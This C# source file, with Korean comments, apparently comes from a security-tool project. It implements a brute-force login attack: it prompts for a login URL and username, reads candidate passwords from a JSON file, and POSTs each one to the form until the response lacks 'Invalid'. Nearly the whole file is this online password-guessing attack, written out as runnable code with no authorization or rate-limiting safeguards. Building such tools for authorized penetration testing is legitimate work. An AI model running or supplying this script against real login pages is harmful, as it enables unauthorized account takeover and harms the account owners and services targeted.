using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Text.Json;
using static Sevz.Models.info;

namespace Sevz.Services
{
    public static class BruteforceAttack
    {
        public static async Task PerformBruteforceAttack(string[] args)
        {
            // 로그인 URL 입력 받기
            Console.Write("Enter the login URL: ");
            string loginUrl = Console.ReadLine();

            // 사용자 이름 입력 받기
            Console.Write("Enter the username: ");
            string username = Console.ReadLine();

            // 비밀번호 리스트가 들어있는 JSON 파일 경로
            string passwordFilePath = "Configurations/passwordex.json";

            // 비밀번호 리스트 불러오기
            List<string> passwordList = LoadPasswordList(passwordFilePath);

            if (passwordList == null || passwordList.Count == 0)
            {
                Console.WriteLine("No passwords found in the JSON file.");
                return;
            }

            // HttpClient 생성
            using (HttpClient client = new HttpClient())
            {
                foreach (string password in passwordList)
                {
                    //todo
                    // 로그인 폼 데이터 설정
                    var postData = new FormUrlEncodedContent(new[]
                    {
                    new KeyValuePair<string, string>("username", username),
                    new KeyValuePair<string, string>("password", password)
                });

                    // POST 요청을 통해 로그인 시도
                    HttpResponseMessage response = await client.PostAsync(loginUrl, postData);
                    string resultContent = await response.Content.ReadAsStringAsync();

                    Console.WriteLine($"Trying password: {password}");

                    // 서버 응답에서 "로그인 실패" 또는 "Invalid" 같은 문자열이 없으면 성공으로 간주
                    if (response.IsSuccessStatusCode && !resultContent.Contains("Invalid"))
                    {
                        Console.WriteLine($"Password found: {password}");
                        break;
                    }
                }
            }
        }

        // 비밀번호 리스트를 JSON 파일에서 불러오는 함수
        static List<string> LoadPasswordList(string filePath)
        {
            try
            {
                string jsonContent = File.ReadAllText(filePath);
                var passwordData = JsonSerializer.Deserialize<PasswordData>(jsonContent);
                return passwordData?.Passwords ?? new List<string>();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading password list: {ex.Message}");
                return new List<string>();
            }
        }
    }

    // JSON 파일에서 비밀번호 리스트를 담는 클래스
    public class PasswordData
    {
        public List<string> Passwords { get; set; }
    }
}
